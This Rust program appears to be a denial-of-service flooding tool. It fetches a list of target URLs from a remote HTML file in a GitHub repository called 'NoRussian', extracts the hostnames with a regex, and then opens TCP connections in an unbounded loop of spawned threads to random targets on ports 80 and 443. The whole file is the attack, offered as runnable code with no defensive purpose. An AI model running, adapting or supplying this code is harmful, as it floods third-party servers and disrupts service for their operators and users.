use std::net::TcpStream;
use rand::prelude::SliceRandom;
use regex::Regex;
use std::thread;
use std::time::Duration;

#[tokio::main]
async fn main() {
    let request =
        reqwest::get("https://raw.githubusercontent.com/ajax-lives/NoRussian/main/index.html")
            .await;
    let cont = request.unwrap().text().await.unwrap();
    let re = Regex::new(r"'https?://[^/']*(/.*)?(/)?':").unwrap();
    let mut urls: Vec<String> = Vec::new();
    for x in re.captures_iter(&cont) {
        urls.push(x[0].to_string());
    }
    loop {
        let url = urls.clone();
        thread::spawn(move || {
            TcpStream::connect(format!(
                "{}:{}",
                url.choose(&mut rand::thread_rng()).unwrap().split("//")
                    .nth(1)
                    .unwrap()
                    .to_string()
                    .split("/")
                    .nth(0)
                    .unwrap()
                    .to_string()
                    .split("'")
                    .nth(0)
                    .unwrap(),
                match rand::random::<bool>() {
                    true => 443,
                    false => 80,
                }
            ));
        });
    }
}
